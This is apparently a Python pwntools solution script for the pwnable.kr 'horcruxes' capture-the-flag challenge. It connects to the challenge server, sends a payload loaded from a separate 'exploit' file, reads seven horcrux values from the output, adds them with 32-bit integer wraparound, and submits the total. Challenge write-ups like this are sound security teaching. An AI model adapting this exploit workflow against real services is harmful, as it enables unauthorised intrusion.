#! /usr/bin/python
from __future__ import print_function
import pwn
import re
import sys

INT_MAX = 0x7fffffff

with open("exploit","rb") as fh:
    exploit = fh.read()

p = pwn.remote("pwnable.kr", 9032)
total = 0

def canonize_signed(num):
    num = canonize_unsigned(num)
    if num > INT_MAX:
        num -= 2**32

    return num

def canonize_unsigned(num):
    if num < 0:
        num += 2**32
    num = num % 2**32
    return num

def main():
    bypass_menu(3)
    give_experience(exploit, already_string=True)
    skip_line()
    collect_horcruxes()
    bypass_menu(3)
    prompt()
    give_experience(canonize_signed(total))


def bypass_menu(opt):
    global p
    p.recvuntil("Menu:")
    print("[X] Bypassing menu.")
    p.sendline(str(opt))

def give_experience(exp, already_string=False):
    global p
    if not already_string:
        exp = str(exp)
    print("[X] Waiting for process to ask about total experience.")
    p.recvuntil("earned? : ")
    print("[X] Sending answer: {}{}".format(exp[:20], "..." if len(exp)>20 else ""))
    p.sendline(exp)

def skip_line():
    global p
    line = p.recvline()
    print("[X] Noted and disregarded input line: \"{}\"".format(line))

def collect_horcruxes():
    print("[X] Collecting horcruxes.")
    global total
    for i in range(7):
        horcrux = int(re.search("\(EXP \+([^)]+)\)",p.recvline()).group(1))
        print("[X] Found horcrux {}".format(hex(canonize_unsigned(horcrux))))
        total = canonize_unsigned(total + horcrux)

    print("[X] Horcrux total {} (base 10 {})".format(hex(total), canonize_signed(total)))

def prompt():
    print("[X] Holding the program until given user prompt...")
    try:
        input()
    except:
        pass

main()
p.interactive()
